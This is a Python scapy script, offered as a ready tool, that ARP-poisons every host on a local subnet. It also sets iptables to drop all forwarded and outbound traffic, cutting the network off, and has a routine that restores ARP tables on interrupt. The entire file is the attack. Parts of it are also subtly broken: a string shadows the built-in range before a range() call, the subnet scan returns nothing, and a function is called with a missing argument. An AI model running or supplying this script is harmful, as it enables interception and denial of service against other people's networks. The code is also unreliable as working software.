#!/usr/bin/env python3
from scapy.all import *
from time import sleep
import sys,os,argparse,subprocess

FOUND = '\033[2;37;42m'
ERR = '\033[0;31;40m'
BAD_ERR = '\033[1;30;41m'
GREEN = '\033[1;32;40m'
LOGO = '\033[1;35;47m'
NONE = '\033[1;37;40m'
ip_list = []
target_ip = ""
ap_ip = ""
target_mac = ""
ap_mac = ""
interface = ""
delay = 0

parser = argparse.ArgumentParser(description=(GREEN + "Proxies entire local traffic through your machine and blocks it completely." + NONE))
parser.add_argument('-i', '--interface', type=str, required=True, help='''Pick an interface which'll be used.''')
parser.add_argument('-g', '--gateway', type=str, required=True, help='''Pick your gateway IP Address.''')
parser.add_argument('-t', '--time', type=float, default=0.3 ,required=False, help='''Optional selection of delays between target poisons.''')
args = parser.parse_args()


def ping(ip):
    proc = subprocess.Popen(["ping","-c","3",ip], stdout=subprocess.PIPE)
    stdout, stderr = proc.communicate()
    response = proc.returncode
    return response


def get_mac_address(ip, interface):
    conf.verb = 0
    ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = ip), timeout = 2, iface = interface, inter = 0.1)
    for snd,rcv in ans:
        return rcv.sprintf(r"%Ether.src%")

def ip_parser(ap_ip):
    ip_list = []
    range = ap_ip
    while range.endswith(".") == False:
        range = range[:-1]
    for ip in range(1,255):
        address = range + ip
        if ping(address) == 0:
            ip_list.append(address)
        else:
            pass
'''
    arp = ARP(pdst=cidr)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    pckt = ether/arp
    result = srp(packet, timeout=3, verbose=False)[0]
    print(result)
    for sent,received in result:
        print({'ip': received.psrc, 'mac': received.hwsrc})
        ip_list.append(received.psrc)
    return ip_list
'''

def reARP(target_ip, ap_ip):
    print(f"Restoring {target_ip}...")
    try:
        send(ARP(op = 2, pdst = ap_ip, psrc = target_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = target_mac), count = 7)
        send(ARP(op = 2, pdst = target_ip, psrc = ap_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = ap_mac), count = 7)
        print(GREEN + "Restored Successfully!" + NONE)
    except:
        print(ERR + f"Unable to send ARP to {target_ip}" + NONE)
        

def exit_handler(interface, ap_ip):
    print("Disabling IP forwarding...")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    print(GREEN + "Disabled Successfully!" + NONE)
    print("Unlocking entire outbound traffic...")
    os.system(f"iptables -P FORWARD ACCEPT")
    os.system(f"iptables -P OUTPUT ACCEPT")
    print(GREEN + "Done!" + NONE)
    print("Restoring targets...")
    try:
        for target_ip in ip_list:
            reARP(target_ip, ap_ip)
            print(GREEN + f"Restored {target_ip}" + NONE)
    except KeyboardInterrupt:
        print(ERR + "User Interruption, halting..." + NONE)
    print(GREEN + "Done!" + NONE)
    print(ERR + "Exiting..." + NONE)
    sys.exit(1)

def proxier(ap_ip, interface):
    try:
        ap_mac = get_mac_address(ap_ip, interface)
        print(ap_mac)
        print(NONE + "Parsing available IP addresses...")
        ip_list = ip_parser(ap_ip)
        print(GREEN + "Done!" + NONE)
        print("Blocking entire outbound traffic...")
        os.system(f"iptables -P FORWARD DROP")
        os.system(f"iptables -P OUTPUT DROP")
        print(GREEN + "Done!" + NONE)
        print("Starting to Poison the Network...")
        while 1 < 2:
            for target_ip in ip_list:
                target_mac = get_mac_address(target_ip)
                try:
                    send(ARP(op = 2, pdst = target_ip, psrc = ap_ip, hwdst= target_mac))
                    send(ARP(op = 2, pdst = ap_ip, psrc = target_ip, hwdst= ap_mac))
                    print(GREEN + f"Poisoned {target_ip}" + NONE)
                except:
                    print(ERR + f"Unable to send ARP to {target_ip}" + NONE)
                sleep(delay)
    except KeyboardInterrupt:
        print(ERR + "User Interrupt, exiting..." + NONE)
        print(ip_list)
        exit_handler(interface,ap_ip)

def main():
    target_ip = ""
    ap_ip = ""
    target_mac = ""
    ap_mac = ""
    interface = ""
    delay = 0.3
    if args.interface:
        interface = args.interface
    if args.gateway:
        ap_ip = args.gateway
    if args.time:
        delay = args.time
    proxier(ap_ip, interface)

if __name__ == '__main__':
    main()
